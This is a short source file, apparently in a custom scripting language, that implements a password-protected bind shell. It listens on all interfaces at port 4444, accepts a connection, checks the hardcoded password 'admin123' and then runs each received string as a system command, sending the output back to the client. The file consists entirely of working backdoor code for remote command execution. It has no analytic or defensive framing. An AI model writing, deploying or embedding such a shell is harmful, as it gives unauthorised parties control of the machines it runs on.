:: Remote shell server

func start_server(host, port, password) {
    let server = system_socket_create(2, 1, 0);
    system_socket_bind(server, [host, port]);
    system_socket_listen(server, 5);
    print(f"[*] Listening on {host}:{port}");
    
    while true {
        let [client, addr] = system_socket_accept(server);
        print(f"[+] Client: {addr}");
        
        let auth = system_socket_recv(client, 256, 0);
        if auth != password {
            system_socket_close(client);
            continue;
        }
        
        system_socket_send(client, "OK", 0);
        
        while true {
            let cmd = system_socket_recv(client, 4096, 0);
            if cmd == "" or cmd == "exit" { break; }
            
            let result = system_subprocess_run(cmd, true, true);
            let output = result.stdout;
            if result.returncode != 0 {
                output = result.stderr;
            }
            
            system_socket_send(client, output, 0);
        }
        
        system_socket_close(client);
    }
}

start_server("0.0.0.0", 4444, "admin123");
